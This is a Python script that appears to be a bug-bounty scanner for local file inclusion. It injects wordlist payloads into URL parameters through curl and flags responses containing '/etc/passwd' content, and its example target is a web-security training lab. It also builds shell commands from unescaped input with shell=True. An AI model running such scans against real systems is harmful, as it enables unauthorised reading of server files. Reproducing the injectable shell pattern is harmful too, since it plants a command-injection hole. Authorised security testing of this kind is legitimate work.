import os
import subprocess
from Operations import Operations
class lfi:
        
    def execute_command(self,command):
        """Execute a shell command and return its output."""
        proc= subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, start_new_session=True)
        stdout,stderr=proc.communicate()
        return stdout.decode("utf-8")

    def lfi(self,end_points):
        errors = []
        reports = {}
        print("[●] Vulnerabilities Scanning  -  LFI")
        try:
            payloads=Operations.get_file_content("/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt")
            for end_point in end_points:
                for payload in payloads[-150:]:
                    new_endpoint=self.execute_command(f"echo '{end_point}' | qsreplace {payload}").strip()
                    command = f"curl -s -L -H 'X-Bugbounty: Testing' -H 'User-Agent: Mozilla/5.0' --insecure '{new_endpoint}'"
                    print(command)                
                    result = self.execute_command(command)
                    print(f"command result:  {result}")
                    if "root:" in result:
                        reports[end_point] = [payload,result]
                        break 
        except Exception as e:
            print(f"Error during scanning: {e}")
            errors.append(str(e))

        found_count =len(reports)
        print(f"[●] Vulnerabilities Scanned  -  LFI\t Found: {found_count}")
        
        return errors, reports

# Example usage
if __name__ == "__main__":
    # Define endpoints to scan (if applicable)
    end_points = ['https://0ac600fe03c3fc8a80967111009400d0.web-security-academy.net/image?filename=61.jpg']
    lfi=lfi()
    errors, reports = lfi.lfi(end_points)
    print("Errors:", errors)
    print("Reports:", reports)
